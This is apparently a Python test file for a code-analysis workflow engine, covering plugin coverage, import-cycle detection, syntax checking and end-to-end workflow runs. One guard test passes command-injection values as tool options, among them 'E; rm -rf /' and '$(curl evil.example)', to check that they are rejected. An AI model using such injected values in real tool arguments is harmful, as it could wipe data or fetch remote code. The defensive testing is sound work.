"""Tests for the shipped plugins and end-to-end execution of bundled workflows."""
import asyncio
import unittest

from engine.workflow.artifacts import STATUS_SKIPPED, STATUS_SUCCEEDED
from engine.workflow.builtins import DependencyGraphPlugin, SyntaxVerifier, register_builtin_plugins
from engine.workflow.plugins import AnalysisContext, registered_kinds, resolve_plugin
from engine.workflow.runner import run_workflow
from engine.workflow.spec import load_builtin_workflow

BUILTIN_WORKFLOWS = ("security-hardening", "architectural-drift", "pr-sanity-verification")


class ShippedWorkflowCoverageTest(unittest.TestCase):
    """A workflow we ship must be runnable with the plugins we ship.

    External tools (semgrep, ruff, eslint) are allowed to be absent — those
    steps report skipped. What is not allowed is a step whose kind has no
    implementation at all, which would fail every run.
    """

    def setUp(self):
        register_builtin_plugins()

    def test_every_shipped_workflow_step_has_an_implementation(self):
        implemented = registered_kinds()
        for name in BUILTIN_WORKFLOWS:
            spec = load_builtin_workflow(name)
            for step in spec.steps:
                if step.role == "synthesizer":
                    continue
                with self.subTest(workflow=name, step=step.step_id):
                    self.assertIn(step.uses, implemented)

    def test_every_shipped_workflow_step_resolves_to_a_plugin(self):
        for name in BUILTIN_WORKFLOWS:
            spec = load_builtin_workflow(name)
            for step in spec.steps:
                if step.role == "synthesizer":
                    continue
                with self.subTest(workflow=name, step=step.step_id):
                    self.assertIsNotNone(resolve_plugin(step))


class DependencyGraphPluginTest(unittest.IsolatedAsyncioTestCase):
    async def test_detects_a_two_module_import_cycle(self):
        context = AnalysisContext(files={
            "pkg/alpha.py": "from pkg import beta\n",
            "pkg/beta.py": "from pkg import alpha\n",
            "pkg/__init__.py": "",
        })
        report = await DependencyGraphPlugin().analyze(context)

        self.assertEqual(len(report.evidence), 1)
        self.assertIn("Import cycle", report.evidence[0].excerpt)
        self.assertEqual(report.evidence[0].severity, "high")

    async def test_reports_nothing_for_an_acyclic_graph(self):
        context = AnalysisContext(files={
            "pkg/alpha.py": "from pkg import beta\n",
            "pkg/beta.py": "x = 1\n",
            "pkg/__init__.py": "",
        })
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())

    async def test_ignores_imports_of_modules_outside_the_review(self):
        # A cycle through an unreviewed module cannot be confirmed from this data.
        context = AnalysisContext(files={"pkg/alpha.py": "import os\nimport requests\n"})
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())

    async def test_survives_an_unparsable_file(self):
        context = AnalysisContext(files={"broken.py": "def (:\n"})
        report = await DependencyGraphPlugin().analyze(context)
        self.assertEqual(report.evidence, ())


class SyntaxVerifierTest(unittest.IsolatedAsyncioTestCase):
    async def test_reports_syntax_errors_with_a_line_anchor(self):
        context = AnalysisContext(files={"good.py": "x = 1\n", "bad.py": "def (:\n"})
        report = await SyntaxVerifier().analyze(context)

        self.assertEqual(len(report.evidence), 1)
        self.assertEqual(report.evidence[0].file, "bad.py")
        self.assertIsNotNone(report.evidence[0].start_line)

    async def test_passes_a_clean_tree(self):
        report = await SyntaxVerifier().analyze(AnalysisContext(files={"good.py": "x = 1\n"}))
        self.assertEqual(report.evidence, ())


class SubprocessPluginGuardTest(unittest.IsolatedAsyncioTestCase):
    async def test_refuses_to_run_without_an_explicit_workspace(self):
        # Otherwise the tool inherits the process CWD and scans whatever is there.
        from engine.workflow.builtins import RuffPlugin

        report = await RuffPlugin().analyze(AnalysisContext(files={"a.py": "x = 1\n"}))
        self.assertIsNotNone(report.skipped_reason)
        self.assertIn("workspace_path", report.skipped_reason)
        self.assertIsNone(report.exit_code)

    async def test_rejects_unsafe_tool_options(self):
        from engine.workflow.builtins import RuffPlugin, SemgrepPlugin

        with self.assertRaisesRegex(ValueError, "Unsafe ruff select"):
            RuffPlugin({"select": "E; rm -rf /"}).extra_args()
        with self.assertRaisesRegex(ValueError, "Unsafe semgrep config"):
            SemgrepPlugin({"config": "$(curl evil.example)"}).extra_args()


class BundledWorkflowExecutionTest(unittest.IsolatedAsyncioTestCase):
    """Runs a shipped workflow end to end against real source."""

    def setUp(self):
        register_builtin_plugins()

    async def test_architectural_drift_runs_to_completion(self):
        context = AnalysisContext(files={
            "pkg/__init__.py": "",
            "pkg/alpha.py": "from pkg import beta\n\n\ndef go():\n    return beta.value\n",
            "pkg/beta.py": "from pkg import alpha\n\nvalue = 1\n",
        })
        spec = load_builtin_workflow("architectural-drift")
        result = await run_workflow(spec, context, resolver=_resolver_skipping_synthesizer())

        self.assertEqual(result.status, STATUS_SUCCEEDED, result.error)
        cycles = [
            item for item in result.evidence
            if item.rule == "graph.dependency.circular_import"
        ]
        self.assertEqual(len(cycles), 1)

    async def test_security_hardening_tolerates_absent_external_tools(self):
        context = AnalysisContext(files={"app.py": "import os\npassword = 'hunter2'\n"})
        spec = load_builtin_workflow("security-hardening")
        result = await run_workflow(spec, context, resolver=_resolver_skipping_synthesizer())

        # semgrep/ruff may or may not be installed; either way the run completes.
        for step_id in ("owasp-top-ten", "python-lint"):
            artifact = result.artifact(step_id)
            self.assertIn(artifact.status, {STATUS_SUCCEEDED, STATUS_SKIPPED})
        self.assertEqual(result.artifact("secrets-and-injection").status, STATUS_SUCCEEDED)


def _resolver_skipping_synthesizer():
    """Synthesis belongs to the LLM layer, so stub it for engine-level tests."""
    from engine.workflow.plugins import BaseAnalyzerPlugin, PluginReport

    class StubSynthesizer(BaseAnalyzerPlugin):
        async def analyze(self, context):
            return PluginReport(summary="synthesis is performed by the LLM layer")

    def resolve(step):
        if step.role == "synthesizer":
            return StubSynthesizer()
        return resolve_plugin(step)

    return resolve


if __name__ == "__main__":
    unittest.main()
